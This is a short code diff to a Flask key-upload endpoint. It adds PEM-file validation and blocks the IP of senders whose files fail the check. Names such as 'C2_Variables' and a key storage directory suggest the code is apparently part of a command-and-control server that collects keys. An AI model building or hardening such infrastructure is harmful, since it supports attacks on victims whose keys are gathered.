@@ -6,7 +6,7 @@ import random
 import sqlite3
 from C2_Variables import api_key, seconds_left, jwt_key, KEY_STORAGE_DIR, DB_PATH
 from Validation import check_keys
-from Extensions import limiter, update_block_ip_list
+from Extensions import limiter, update_block_ip_list, check_pem_file
 
 key_bp = Blueprint('key', __name__)
 
@@ -35,6 +35,12 @@ def upload_key():
         ip = request.remote_addr
         update_block_ip_list(ip)
         return jsonify({"error": "File type"}), 400
+    
+    valid_file, file_error = check_pem_file(key_file)
+    if not valid_file:
+        ip = request.remote_addr
+        update_block_ip_list(ip)
+        return jsonify({"error": file_error}), 400
     
     key_path = os.path.join(KEY_STORAGE_DIR, key_filename)
     correct_key_path = os.path.realpath(key_path)
